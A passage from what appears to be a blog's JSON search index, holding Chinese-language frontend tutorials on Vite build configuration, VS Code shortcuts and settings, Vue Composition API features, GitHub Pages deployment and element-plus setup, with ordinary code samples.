&amp;&amp; vite build --mode dev\", // &lt;- 讀取 .env.dev \"preview\": \"vite preview\"} 此外，我也希望最後 build 出來的檔案可以放在不同的資料夾中，所以會把 vite-config.ts 修改成這樣： 1234567891011121314151617181920import { defineConfig } from 'vite'import react from '@vitejs/plugin-react'import eslint from 'vite-plugin-eslint'import tsconfigPaths from 'vite-tsconfig-paths'const pathMapping = { demo: './build-demo', dev: './build-dev', production: './build-production'} as { [key: string]: string }// 自動接收到一個 obj，其中 obj.mode 會對應到 vite build --mode &lt;string&gt;export default ({ mode }: { mode: string }) =&gt; { return defineConfig({ plugins: [react(), eslint(), tsconfigPaths()], build: { outDir: pathMapping[mode] ?? './dist' } })} 這邊如果在 build 的時候出錯通常是跟 typescript 編譯時的型別錯誤有關，可以看一下錯誤訊息並且修正即可。 如果你已經跟著每一步做到這邊，恭喜你！整個 start project 就已經建立完囉。 結語整個 ESLint 設定的流程說複雜不複雜，說容易也不容易，畢竟走下來會發現常常碰到裝了 A 以後 B 就出問題，又或者是因為 TypeScript 的關係要處理的相容問題變的麻煩許多，所以我其實也花了大概一天的時間才把整個前後關係給釐清。 會寫這篇的契機主要還是因為網路上的資源比較零散，也許是因為大家都是從網路上互相參考的關係，總覺得比較熱門的內容都長得有點類似，連沒講清楚的地方也剛好很巧的沒有人提到，所以只好自己試著把這些零散的內容給組再一起，試著讓它完整更清楚一些。 我覺得學一樣東西最重要的還是理解那樣的東西的核心部分，像我寫完這篇以後就對 ESLint 的整個概念就清楚了許多，在走每一步的時候也很清楚自己在做什麼事情。如果上面的地方有哪邊覺得不太懂的話，我想可能就是你對 ESlint 的部分沒有很熟所以才會有這些疑問，建議可以參考最下面附的資源，我覺得這些對我當初在建構的時候帶來了不少幫助。 最後，如果你真的很懶的自己走這每一步的話，以上的完成品我有放在 GitHub 上，可以參考底下連結： 參考資料 Setting up vite, React, TypeScript, eslint, vitest, testing-library and react-router ESLint + Prettier + VS Code — The Perfect Setup VSCode ESLint, Prettier &amp; Airbnb Style Guide Setup Absolute Imports and Module Path Aliases [note] 建立公司內部使用的 eslint-config package [note] ESLint","link":"/2022/12/01/vite-start-project/"},{"title":"VS-Code 一些實用的快捷鍵","text":"一樣是快捷鍵系列。 Windows Ctrl + G 跳到某一個行數 Ctrl + E Ctrl + P 切換到某個檔案的分頁 Ctrl + E + @[變數名稱 / Tag / 內容] 切換到某個分頁的某個段落 Ctrl + L 選取整行內容 Ctrl + X Shift + Delete 刪除整行內容 Shift + 方向鍵 選取文字 Ctrl + 方向鍵 單字間跳躍（若要選取的話就加上 Shift） Home鍵 跳到句子頭端 End鍵 跳到句子尾端 Ctrl + D 選取同名字串 Ctrl + Shift + L 選取所有同名字串 Alt + 方向鍵 移動程式碼區塊（可搭配選取內容使用） Alt + 左右方向鍵 切換分頁 Alt + Shift + 上或下 複製程式碼區塊（可搭配選取內容使用） Alt + Shift + R 打開資料夾總管 Alt + Z 自動換行開關（關掉後就不會隨著寬度換行） Ctrl + H 搜尋內容 + 取代內容 Ctrl + Shift + E 切換到檔案面板（側邊欄） Ctrl + Shift + F 切換到搜尋面板（側邊欄） Ctrl + N 新增檔案 Ctrl + K，M 選擇檔案的程式語言 Ctrl + Shift + O 搜尋變數、函式 F2 修改變數或函式的名稱（不會改到字串）（記得先選取） F12 查看某段函式的內容 Ctrl + ~ Ctrl + J 打開或關閉終端機 Ctrl + / 註解 Alt + Shift + A 多行註解 Ctrl + B 打開或關閉側邊攔 Shift + Alt + F 對內容排版 Ctrl + Shift + M 查看有 Bug 的分頁 Ctrl + \\ 切割視窗 Ctrl + ， Ctrl + 。 快速標點符號 Ctrl + K + L 摺疊或展開一個區塊的內容 Ctrl + K，W 關閉所有分頁 Ctrl + K + U 關閉所有「已儲存」的分頁 Ctrl + Shift + T 復原分頁（只回復最後一個關掉的分頁） Ctrl + M 把 tab 鍵變成 focus 功能（就是 tab 的預設功能） Ctrl + K + S 存檔所有分頁 Mac Command + Option + up/down 多個游標 Option + up/down 移動程式碼 Command + P 切換分頁 Command/Fn + left/right Home 鍵和 End 鍵的功能 Command + top/bottom 跳到檔案的起始位置/終點位置（可搭配 shift 選取） Command + Shift + L 選取所有相同的文字 Command + L 選取整行 Command + Shift + left/right 等於 Ctrl + L 的效果 Option + esc 或 command + i 可以自動顯示相關的 value 或 props Command + K + V 打開 markdown preview 視窗 Option + Command + S 存擋所有分頁 Shift + Command + . 打開 breadcrumb，並且用 ← 和 → 來移動位置 Option + Command + click 把 definition 分割到新分頁 Command + Shift + O 搜尋函式 or 變數的 popup Shift + F12 打開某個變數或函式的所有 reference popup F12 跳到 reference 或 definition 的位置 F8 跳到 Linter 的錯誤位置 Command + Shift + M 打開 Linter 錯誤列表 Ctrl + g 跳到指定行數 Command + j toggle panel 收合（terminal） Command + \\ 分割視窗（垂直） Command + 1 or 2 or 3... 切換到不同的分割視窗 Command + K, Command + \\ 分割視窗（水平） Command + Option + ← / → 切換 Tab 頁面（也可以把游標切換到分割視窗） Command + Option + [ / ] 收起 / 展開程式碼區塊 Command + Shift + \\ 跳到起始 bracket 或結尾 bracket（跟 vim 的 % 一樣功能） Command + Shift + E 把游標移到 Side bar 或 Editor Command + Shift + F 打開搜尋側邊欄 Space 打開在 Sidebar 中選取的檔案 Option / Control + Enter 以分割視窗開啟分頁 Command K + Command I 彈出 Symbol 的型別內容（滑鼠 hover 會彈出來的那個） Option + F5 跳到下一個更新的位置（Git） Command + K + I 觸發 hover 效果 這邊的詳細資訊可以參考 VS-Code 的 官方文件 介紹。 Emmet 的設定如果想在 JS 的 template string 中使用 Emmet，可以加上這段設定： 12345// 要包含的語言（預設應該是只有 HTML吧）\"emmet.includeLanguages\": { \"javascript\": \"javascriptreact\",},\"emmet.triggerExpansionOnTab\": true, 用 CLI 打開 VS-Code 的方式首先先用 VS-Code 添加環境變數 Command + Shift + P 搜尋 shell，然後 Enter 看到 OK 就好了。 打開整個資料夾： 1code . 打開指定檔案： 1code file.js 只打開 VS-Code： 1code -- 更改左側資料夾的顯示方式原本是長這樣： 但你可能會希望是這樣： 這時候只要新增一項設定就好： 12// 預設是 true\"explorer.compactFolders\": false, 搞定！ 顯示提示內容在使用 trigger suggestion 的時候你可能會想看他的 detail，像這樣： 不過因為預設的快捷鍵跟 Mac 有衝突，所以建議能把 toggleSuggestionDetails 調整一下： 幫 function 加上說明只要輸入 /** 就會自動產生像這樣的 snippe 12345678910/** * 加入購物車的函式，讚吧！ * @param {Number} num 產品的 id * */function addToCart(num) { console.log(`add item ${num} to cart.`)}module.exports = addToCart 可以加入說明文字，而 {Number} 的部分代表參數 num 的資料型態。 接著在使用這個 function 的地方就會出現對應提示： 我的 VS-Code 設定檔1234567891011121314151617181920212223242526{ \"workbench.panel.defaultLocation\": \"right\", \"editor.cursorSmoothCaretAnimation\": \"on\", \"explorer.compactFolders\": false, \"workbench.iconTheme\": \"material-icon-theme\", \"terminal.integrated.fontSize\": 14, \"editor.fontFamily\": \"'JetBrainsMono Nerd Font', Monaco, 'Courier New', monospace\", \"editor.tabSize\": 2, \"editor.fontSize\": 14, \"editor.fontLigatures\": true, \"editor.formatOnSave\": true, \"editor.defaultFormatter\": \"esbenp.prettier-vscode\", \"editor.suggest.showStatusBar\": true, \"prettier.jsxSingleQuote\": true, \"prettier.printWidth\": 120, \"prettier.singleAttributePerLine\": true, \"prettier.semi\": false, \"prettier.singleQuote\": true, \"prettier.trailingComma\": \"none\", \"emmet.includeLanguages\": { \"javascript\": \"javascriptreact\" }, \"formattingToggle.affects\": [\"editor.formatOnSave\"], \"explorer.fileNesting.enabled\": false, \"editor.minimap.enabled\": false} 有修改的快捷鍵 Go forward：Command + ] Go back：Command + [ Indent line 移除 Outdent line 移除 推薦裝的套件 Material Icon Theme 美美的 Icon One Dark Pro 配色主題一 Tokyo Night 配色主題二 Dracula Official 配色主題三 expand-region 選取工具 indent-rainbow 縮排醒目色彩 Code Spell Checker 錯字檢查 Hex 轉 RGBA 色彩轉換 ESLint 就是檢查 JS 的 Linter Power Mode 炫泡的 typing 效果 :emojisense: 快速插入 emoji GitLens 團隊合作時很好用 RapidAPI Client 不想用 PostMan 的另一種選擇 Tailwind CSS IntelliSense 寫 Tailwind 的好幫手！ env-cmd-file-syntax 支援 env 檔案 ES7+ React/Redux/React-Native snippets React Snippets Live Server Live Server 不解釋 MDX MDX 語法 TypeScript Vue Plugin (Volar) 給 Volar 用的 TypeScript 套件 Vue Language Features (Volar) Vue 語法支援 Clipboard Manager 複製貼上好幫手 change-case 把單字轉換成各種 case CodeSnap 加了美圖秀秀的程式碼（拍立得） Center Editor Window 視角置中（有用過 vim 的 zz 都懂） jumpy 快速把游標跳到想要的位置。 Inline Parameters for VSCode 顯示 parameter 的名稱（類似 IntelliJ） Formatting Toggle 一鍵切換 Formatter pretty-ts-errors 給人類看的 TS 錯誤訊息 markdown-all-in-one 有在用 markdown 的人不要錯過！ TODO-Highlight 就是 TODO 貼紙 參考資料 毛毛前端筆記 20 個 VSCode 開發小技巧，讓你 Coding 三倍速！ Visual Studio Code 必裝套件(extensions)","link":"/2021/12/14/vs-code-shortcut/"},{"title":"Vue－基本架構與懶人包","text":"懶人包總是最方便的。 這邊先透過 CDN 把 Vue 引入： 1&lt;script src=\"https://unpkg.com/vue@3.0.2\"&gt;&lt;/script&gt; 接著就能開始寫 JS 了： 12345678910111213141516const app = Vue.createApp({ data() { return { message: 'Hello Vue', name: 'PeaNu', age: 20 } }, methods: { handleChangeMsg(newMessage) { this.message = newMessage } }})app.mount('#app') 只要透過 Vue 的 createApp 我們就能建立一個元件，裡面會傳入一個物件來儲存元件的 data、methods 等等之類的東西。 app.mount 則是讓我們用來告訴 Vue 要把元件「綁定」到哪一個元件上？基本上綁定就等於把「控制權交給 Vue」，所以現在只要是包含在 #app 這個裡的 HTML 元素都會被 Vue 控制。 只有被 Vue 控制的元素才可以用「v-directive」跟「template」這些東西，簡單來說就是 Vue 的語法。 這邊只是帶你認識一些基本結構所以才用 CDN，不然基本上現在要開發一個 Vue 專案時會透過「Vue－CLI」來開發比較多，這點要注意一下。 v-directive @event 建立事件監聽 v-if / v-else 條件渲染（操作 DOM 元素） v-show 條件渲染（透過 CSS 來控制 display） v-for 列表渲染（要用 in 或 of 都可以，沒有差別） v-slot:name 建立命名 slot :attr 動態的屬性值 v-model 資料與畫面雙向綁定 modifier keyup.ctrl 按著 ctrl 時才會 trigger v-model.trim 去掉頭尾空白字元 keydown.prevent 取消預設行為（可以用來避免 enter 送出表單） 順道一提關於 v-modal 背後的機制其實只是這樣： 1&lt;input type=\"email\" @input=\"email = $event.target.value\" :value=\"email\" /&gt; 這就跟你在 React 裡面把 value 跟 state 綁再一起，接著再用 onChange 去改變 state 的道理是差不多的。只是 Vue 綁定的事件有點不同而已（onInput 或 onChange） 跟 $ 有關的東西基本上只要是 $ 開頭的東西都是被綁在 Vue 的實體上，所以會需要透過 this 來取得。 $event 用來取得 Event 物件 $ref 用來取得 DOM 元素 $emit 用來自定義事件 $route 用來取得路由資訊 $router 用來操作路由 也因為和 this 有關，所以如果是寫 Composition API 的話基本上看不太到跟 $ 有關的東西 XD","link":"/2022/07/30/vue-basic/"},{"title":"Vue－Composition API（watch & watchEffect）","text":"會讓人想起 React 的東西。 簡述watch 的用法就跟 options API 中的用法差不多，這邊就不多解釋，主要會特別介紹的是 watch Effect。 這邊先來看段 code： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;template&gt; &lt;div class=\"home\"&gt; &lt;input type=\"text\" v-model=\"search\" placeholder=\"search\" /&gt; &lt;br /&gt; &lt;!-- 更新 search2 不會有任何效果 --&gt; &lt;input type=\"text\" v-model=\"search2\" placeholder=\"search2\" /&gt; &lt;br /&gt; &lt;button @click=\"onCancel\"&gt;Canel Watch &amp; Effect&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { ref, watch, watchEffect } from 'vue' export default { setup() { const search = ref('') const search2 = ref('') // 回傳值 = stopHandler const stopWatchSearch = watch( search, (now, prev) =&gt; { console.log('run watch') console.log('new', now) console.log('old', prev) }, { deep: true } ) // 回傳值 = stopHandler const stopWatchEffect = watchEffect(() =&gt; { console.log('run effect', search.value) }) const onCancel = () =&gt; { stopWatchSearch() stopWatchEffect() } return { search, search2, stopWatchSearch, onCancel } } }&lt;/script&gt; 附註：如果想實際玩玩看的話能可以到這裡。 這個範例其實是用 watch 和 watchEffect 去監聽 search 和 search.value 的值，不過這兩個的行為有幾個差別： watch 在第一次 reder 時不會被執行，watchEffect 會 watch 必須明確的指定要「監聽哪個值」他才會做出反應，而 watchEffect 則是會自動根據 callback 所「用到的值」來做出反應（這邊用到的值是 search.value） 另外這兩個 hook 都會回傳一個 stopHandler，是拿來取消 watch 和 watchEffect 的效果。 總而言之，watchEffect 就跟 React useEffect 有點像，只是 Vue 已經自動幫你處理好 dependencies 的問題了。 Cleanup function這邊要順便提一下 watchEffect 其實有提供「Clean up」的功能，用起來會像這樣： 123watchEffect((onCleanup) =&gt; { onCleanup(() =&gt; console.log('clean up'))}) 就跟 React 裡面的 cleanup function 一樣，他會在 unmount 的時候執行。","link":"/2022/08/16/vue-compisition-api-watch-and-watch-effect/"},{"title":"Vue 版的 Custom Hook－Composables","text":"跟 React 一樣棒的功能。 簡述這個功能我覺得就跟 React 的 Custom Hook 幾乎一樣，所以我就不解釋太深了，簡單來說就是把原本在 setup 中的邏輯抽出去寫成「一個 module」，接著再到元件中拿進來用就好。 這種作法被稱為「Composables」或「Composition Function」，不過這只是一種俗稱而已，並不是官方定義的名稱。 總之先來一段常見的 fetch 範例： 12345678910111213141516171819202122232425&lt;script&gt; import { ref } from '@vue/reactivity' export default { setup() { const posts = ref([]) const error = ref(null) const getPosts = async () =&gt; { try { const response = await fetch('http://localhost:3000/posts') if (!response.ok) throw new Error('No data available') const data = await response.json() posts.value = data } catch (exception) { error.value = exception.message } } getPosts() return { posts, error } } }&lt;/script&gt; 寫過 React 的 custom hook 的話就會知道，我們這一段其實可以抽出去寫成一個 hook，只要記得在最後把 posts 和 error 這兩個「state」給 return 出來就行了。 Vue 也是在做差不多的事情，我們可以建立一支 src/composables/useFetch，然後寫入這樣的內容： 附註：這邊的名稱只是因為想不到更好的命名而參考 React hook 的風格，Vue 裡面並沒有要求要 use- 來當前綴哦，你想取啥都能。 1234567891011121314151617181920212223import { ref } from 'vue'export const useFetch = (url) =&gt; { const data = ref([]) const error = ref(null) const getPosts = async () =&gt; { try { const response = await fetch(url) if (!response.ok) throw new Error('No data available') const json = await response.json() data.value = json } catch (exception) { error.value = exception.message } } // trigger when call this hook getPosts() // expose states return { data, error }} 接著原本的檔案就可以簡化為這樣： 123456789101112&lt;script&gt; import { useFetch } from '@/composables/useFetch' export default { setup() { const url = 'http://localhost:3000/posts' const { data, error } = useFetch(url) // 如果想重新命名的話得在這邊「輸出」的時候改才行 return { posts: data, error: error } } }&lt;/script&gt;","link":"/2022/08/23/vue-composable/"},{"title":"Vue－Composition API 前言","text":"終於來了。 希望解決 Options API 的弊病 code 散落各地，缺發群聚性，可讀性也差 同樣的邏輯沒辦法被重用 簡單來說 Composition API 可以讓你的 code 群組起來，也實現了「把邏輯抽出去」的功能，換句話說就跟 React 的 custom hook 是很像很像的概念，所以才會這麼多人愛用它。 基本用法先來看 code 再來解釋： 12345678910111213141516171819202122&lt;template&gt; &lt;div class=\"home\"&gt; &lt;h2&gt;Home&lt;/h2&gt; &lt;p&gt;Hello, My Name is {{ name }}, and I'm {{ age }} years old&lt;/p&gt; &lt;button @click=\"onClick\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { setup() { let name = 'PeaNu' let age = 24 function onClick() { console.log('Clicked') } // 這個 return 很重要 return { name, age, onClick } } }&lt;/script&gt; 要使用 Composition API 的第一步就是建立 setup hook，他其實就是一個 function 而已，不過特別的地方在於「可以直接在裡面寫 JavaScript」。 上面可以看到在 setup 中我可以建立變數或函式，這個是在 Options API 中沒辦法做到的事情。 接著最後再用 return 把東西給丟出去，這個目的是為了： 讓 template 中能夠存取 讓 template 中能夠存取 讓 template 中能夠存取 寫到這裡應該會發現這跟 React 的 custom hook 很像，我們都是把邏輯封裝在 function 後再把對應的 state 或 method 給 return 出去，所以這邊應該不難理解為什麼能這樣子操作。 總之這個就是最基本的用法，接下來是幾個補充知識： 觸發時機setup 是生命週期中「最先開始」被執行的 hook，也就是 created、beforeCreate 都還要前面。 你可以試著拿這段去跑跑看就懂意思了： 123456789101112131415161718export default { setup() { console.log('settng...') let name = 'PeaNu' let age = 24 function onClick() { console.log('Clicked') } return { name, age, onClick } }, beforeCreate() { console.log('creating...') }, created() { console.log('created') }} 出來的順序一定是： settng... creating... created 或也可以回去複習一下 Vue－生命週期 的那張圖，裡面可以看到 setup 會是第一個被執行的 hook。 預設不具有 Reactive 的功能附註：這邊有強調這是「預設」，所以並不是無法做到，這點要先搞清楚。 簡單來說我們從 setup 中傳出去的變數就算被「更新」了，也不會「反應」在 template 上，像這樣： 12345678910&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p&gt;Hello, My Name is {{ name }}, and I'm {{ age }} years old&lt;/p&gt; &lt;button @click=\"changeName\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;export default { setup() { let name = 'PeaNu' let age = 24 return { name, age } }, methods: {changeName() { this.name = 'PPB' // 這邊的 log 會印出 PPB，但畫面上的 name 依然為 PeaNuconsole.log(this.name) } } } 所以這個跟我們用 data 來建立資料時有很大的不同，要特別留意這點。","link":"/2022/08/10/vue-composition-api-basic/"},{"title":"Vue－Composition API（Computed）","text":"懶人包。 簡述寫得越多你就越會發現都是這個 pattern：想要什麼就拿出來用 所以 Computed 也是一樣，直接看範例就懂了： 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div class=\"home\"&gt; &lt;input type=\"text\" v-model=\"search\" /&gt; &lt;p&gt;Search term - {{ search }}&lt;/p&gt; &lt;ul&gt; &lt;li v-for=\"name of matchingNames\" :key=\"name\"&gt;{{ name }}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; // 把 computed 拿出來用 import { computed, reactive, ref } from 'vue' export default { setup() { const names = ref(['mario', 'jojo', 'dio', 'luigi', 'koopa', 'peanu', 'ppb', 'joslon']) const search = ref('') const matchingNames = computed(() =&gt; names.value.filter((name) =&gt; name.includes(search.value)) ) return { names, search, matchingNames } } }&lt;/script&gt; 這是一個搜尋的功能，matchingNames 就是根據關鍵字搜尋後的結果。","link":"/2022/08/14/vue-composition-api-computed/"},{"title":"Vue－Composition API（Life Cycle Hooks）","text":"又見面了。 簡述在 setup 中也可以使用 Lifecycle hooks，唯一的差別就是多了 on- 這個前綴，例如 mounted -&gt; onMounted 。 這邊附贈一個簡單的範例。 Home.vue： 12345678910111213141516171819202122232425&lt;template&gt; &lt;div class=\"home\"&gt; &lt;!-- 觸發 onUnmounted --&gt; &lt;router-link :to=\"{ name: 'About' }\"&gt;About&lt;/router-link&gt; &lt;!-- 輸入時觸發 onUpdated --&gt; &lt;input type=\"text\" v-model=\"input\" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { ref } from '@vue/reactivity' import { onMounted, onUnmounted, onUpdated } from '@vue/runtime-core' export default { setup() { onMounted(() =&gt; console.log('mounted')) onUpdated(() =&gt; console.log('updated')) onUnmounted(() =&gt; console.log('unmounted')) const input = ref('') return { input } } }&lt;/script&gt; 應該不難理解，真的有疑問的話到 這邊 玩玩看吧。","link":"/2022/08/18/vue-composition-api-life-cycle/"},{"title":"Vue－Composition API（Props）","text":"小知識。 簡述要在 setup 中存取 props 的方式很簡單，就是透過 setup(props) 來拿到這個參數就行了。 來看一個範例，假設我們有一個頁面長這樣： 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div class=\"home\"&gt; &lt;div v-for=\"post of posts\" :key=\"post.title\"&gt; &lt;!-- 傳入 props --&gt; &lt;SinglePost :post=\"post\" /&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import SinglePost from '../components/SinglePost.vue' export default { components: { SinglePost }, setup() { const posts = [ { title: 'CSS Top 5 tricks', body: 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sunt culpa nulla harum officia vitae. Fugit deserunt similique neque? Molestias, enim! Quidem obcaecati esse blanditiis dicta facilis voluptate magni non similique!' }, { title: 'TypeScript Tutorial', body: 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sunt culpa nulla harum officia vitae. Fugit deserunt similique neque? Molestias, enim! Quidem obcaecati esse blanditiis dicta facilis voluptate magni non similique!' } ] return { posts } } }&lt;/script&gt; 這邊想要把 posts 當成 props 傳給 &lt;SinglePost /&gt;，來看要怎麼做： 12345678910111213141516171819&lt;template&gt; &lt;div class=\"post-list\"&gt; &lt;h2&gt;{{ post.title }}&lt;/h2&gt; &lt;p&gt;{{ bodySnippet }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { computed } from '@vue/runtime-core' export default { // 這個一樣要寫出來，template 才有辦法用 props: ['post'], // 接收 props setup(props) { const bodySnippet = computed(() =&gt; props.post.body.substring(0, 100) + '...') return { bodySnippet } } }&lt;/script&gt; 這邊要特別注意的地方就是 props 屬性的部分，如果是 &lt;template&gt; 會用到的「那種 props」的話就得列出來，反之則不用（不過應該很少這種情況啦）。","link":"/2022/08/17/vue-composition-api-props/"},{"title":"Vue－Composition API（useRouter & useRoute）","text":"很 hook 的味道。 useRouter &amp; useRoute以往在用 Options API 控制路由的時候我們會這樣寫： 1234567891011methods: { gonback() { this.$router.go(-1) }, goForward() { this.$router.go(1) }, redirect() { this.$router.push('/') }} 不過在 Composition API 中因為 setup 沒辦法存取到 this 的關係，所以得改用 useRouter 和 useRoute 這兩個 hook 來做，用起來會像這樣： 12345678910111213141516171819202122&lt;script&gt; import { useRouter } from 'vue-router' export default { setup() { // get router instance const router = useRouter() function goBack() { router.go(-1) } function goForward() { router.go(1) } function redirect() { router.push('/') } return { goBack, goForward, redirect } } }&lt;/script&gt; 123456789101112&lt;script&gt; import { useRoute } from 'vue-router' export default { setup() { // get route instance const route = useRoute() // get params id console.log(route.params.id) } }&lt;/script&gt; 總之這就是在 setup 中存取路由的方式，不得不說還以為我在寫 React 呢 XD","link":"/2022/08/24/vue-composition-api-router/"},{"title":"Vue－可以幫我記住這個值嗎？（Computed）","text":"會蠻常用到的功能。 寫過 React 的人可以把它想成是類似 useMemo 的概念。useMemo 的用途是用來「記住 function 的回傳值」，但不一樣的地方是 Vue 會自己判定這個值什麼時候該重新計算，不像我們寫 React 的時候還要自己定義 dependencies。 我們通常用它來對 data 中的資料做處理，最常見的例子是 filter： 12345678910111213141516171819202122const app = Vue.createApp({ data() { return { users: [ { name: 'PeaNu', age: 25, img: './assets/chung.jpeg', isOnline: true }, { name: 'PPB', age: 24, img: './assets/ppb.png', isOnline: true }, { name: 'ET', age: 999, img: './assets/badguy.jpeg', isOnline: false } ] } }, methods: { toggleOnline(name) { this.users = this.users.map((u) =&gt; (u.name === name ? { ...u, isOnline: !u.isOnline } : u)) } }, computed: { // 只留下在線上的 user onlineUsers() { return this.users.filter((u) =&gt; u.isOnline) } }}) 只要 this.users 的值沒有改變，onlineUsers 就永遠不會被重新計算。 另外要注意的一件事情是： 如果 template 中沒有用到 computed 的話就不會執行 如果 template 中沒有用到 computed 的話就不會執行 如果 template 中沒有用到 computed 的話就不會執行 這算是我自己 debug 時踩到的雷吧，只是順便提一下。","link":"/2022/07/31/vue-computed/"},{"title":"Vue－部署到 GitHub 上的方法","text":"簡單紀錄。 簡述詳細可以參考這份 官方文件，這邊只會簡單帶一下步驟。 首先去設定 vue.config.js.，調整 public 的檔案路徑： 123456module.exports = { publicPath: process.env.NODE_ENV === 'production' ? '/my-project/' // production : '/' // development} 接著在寫一份 shell script 來處理就好，原理的話看註解應該就懂了： 12345678910111213141516171819#!/usr/bin/env sh# 当发生错误时中止脚本set -e# 构建npm run build# cd 到构建输出的目录下cd distgit initgit add -Agit commit -m 'deploy'# 部署到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;git push -f https://github.com/{username}/{project-name}.git master:gh-pagescd -","link":"/2022/07/28/vue-deploy/"},{"title":"Vue－動態 class 值","text":"凡事都要動態。 簡述假設我的元件資料長這樣： 1234567891011const app = Vue.createApp({ data() { return { users: [ { name: 'PeaNu', age: 25, img: './assets/chung.jpeg', isOnline: false }, { name: 'PPB', age: 24, img: './assets/ppb.png', isOnline: true }, { name: 'ET', age: 999, img: './assets/badguy.jpeg', isOnline: false } ] } }}) 我希望在 isOnline 是 true 的時候加上特定的 class，可以用這種方式來寫： 1234567891011121314&lt;div id=\"app\"&gt; &lt;ul&gt; &lt;!-- user.isOnline = true 時加上 online 這個 class --&gt; &lt;li v-for=\"user of users\" class=\"default\" :class=\"{ online: user.isOnline }\"&gt; &lt;div&gt; &lt;img :src=\"user.img\" :alt=\"user.name\" /&gt; &lt;/div&gt; &lt;div&gt; {{ user.name }} &lt;br /&gt; {{ user.age }} &lt;/div&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 就是在 :class 傳入一個物件，key 就代表 className，value 則是用來的開關（true / false）。 順道一提如果你的 key 不是合法的輸入，像是 card-body 的話，記得要用「字串的形式」來填入。","link":"/2022/07/25/vue-dynamic-class/"},{"title":"Vue-element-plus 環境配置","text":"從 React 轉成 Vue 馬上就踩雷。 簡述當初是看 官方文件 來配置的，不過我自己覺得實在是寫得有點亂，因為當時的主流都是以 Vite 為主，而 Vue-CLI 的相關資料就顯得少蠻多的。 總之呢，這篇會以 Vue-CLI 的角度來寫一篇更好懂的教學來記錄一下，也順便解釋一些基本觀念。 前備知識當初在配置時花了一段時間才搞好，這是因為 Vue 跟 React 在引入 UI 元件的方式有點不太一樣，所以我想先在這邊解釋一下差別。 首先在 React 中如果要使用 Mui，我們通常是這樣做： 123456import * as React from 'react'import Button from '@mui/material/Button'function App() { return &lt;Button variant='contained'&gt;Hello World&lt;/Button&gt;} React 的做法是「直接在元件中把 UI 元件引入」。以我自己的角度而言這是很直覺的方式，畢竟就是直接 import 進來用嘛？ 而 Vue 除了直接在 SFC 中引入以外，還有一種更簡潔的做法，這邊拿 element-plush 來舉例。 直接在 SFC 中引入： 1234567891011121314&lt;template&gt; &lt;nav&gt; &lt;el-button type=\"primary\"&gt;Hello&lt;/el-button&gt; &lt;/nav&gt; &lt;router-view /&gt;&lt;/template&gt;&lt;script&gt; import { ElButton } from 'element-plus' export default { components: { ElButton } }&lt;/script&gt; 雖然這樣做也可行，不過你應該會更常看到下面這種寫法： 12345678910import { createApp } from 'vue'import App from './App.vue'import { ElButton } from 'element-plus'import 'element-plus/dist/index.css'const app = createApp(App)// 註冊（元件名稱，元件）app.component(ElButton.name, ElButton)app.use(router)app.mount('#app') 這個作法是直接「在 Vue 實體上註冊（Register）全域元件」。 意思就是所有的 SFC 中可以直接使用 &lt;el-button&gt;，不用再做引入的動作。 這應該算是 Vue 的特色吧，雖然一開始覺得這好搞剛，不過多寫一段時間後就會覺得這樣其實也不錯。 總之如果你是用 Vue 的 UI library，你基本上都會看到第二種寫法，只是想解釋一下這背後的原因是什麼。 安裝依賴項目這邊先用 Vue-CLI 的 create &lt;project&gt; 建立好以後再來安裝： 1npm element-plus 引入引入的方式有兩種，分別為「全部引入」跟「按需引入」。 這裡順便提一個小知識，我們在 import 套件時雖然都會寫成 import { ElButton } from 'element-plus' 這樣的形式，不過實際上的路徑是對應到 node_modules/element-plus/lib/index 這個位置。 總之如果等一下引入部分你發現有問題，可以試著檢查看看是不是路徑不對，通常有 90% 都是因為這樣子，試著自己 debug 看看吧！ 全部引入意思就是一次把所有元件都引入： 12345678910111213// main.jsimport { createApp } from 'vue'import App from './App.vue'// cssimport 'element-plus/dist/index.css'// components (all)import ElementPlus from 'element-plus'const app = createApp(App)// registerapp.use(ElementPlus)app.use(router)app.mount('#app') 不管是 CSS 還是元件都直接全部引入，接著就可以直接在元件中使用了。這招最簡單，但缺點就是你如果你用的數量不多的話會顯得浪費。 按需引入這邊是我覺得文件中寫的最麻煩的地方，一開始就要你安裝一堆套件跟調整 webpack。 這邊我想先介紹一下最簡單的方式，這邊你不需要安裝任何東西，只要先這樣寫就好： 12345678910111213// main.jsimport { createApp } from 'vue'import App from './App.vue'import router from './router'import { ElButton } from 'element-plus'// cssimport 'element-plus/dist/index.css'const app = createApp(App)// registerapp.component(ElButton.name, ElButton)app.use(router)app.mount('#app') 其實就是把需要的元件拿出來用而已，而不是整包拿出來。 不過這邊應該會注意到 CSS 的部分是引入 index.css，有沒有辦法只引入 Elbutton 會用到的 CSS 就好？ 有，這個就是文件裡面要你安裝各種套件跟調整設定的原因。如果你沒有很在意「體積」的問題的話，底下的部分你可以略過，因為完全沒有必要。 總之這樣子做的用意是降低容量，根據我實測的結果來看最多可以減少個 100KB 左右吧（看你實際用的多或少），所以這個就看真的看個人需求來決定了 首先來安裝新的包： 1npm i unplugin-element-plus -D 接著調整 vue.config.js： 12345678910module.exports = defineConfig({ // ... configureWebpack: { plugins: [ require('unplugin-element-plus/webpack')({ // options }) ] }}) 附註：關於 options 的部分想知道更多可以參考文件。 這個包的用途就是在我「引入元件時也自動引入對應的 CSS 檔案」，像這樣： 123456// 我看起來只引入了這個import { ElButton } from 'element-plus'// 但實際會在背後幫我多引入 CSS 檔案import { ElButton } from 'element-plus'import 'element-plus/es/components/button/style/css' 看到這邊你應該也理解為什麼要有這個套件了吧？畢竟妳不可以每用一個元件就去找出對應的 CSS 來引入，怎麼想都太麻煩了，所以才會寫成套件來處理。 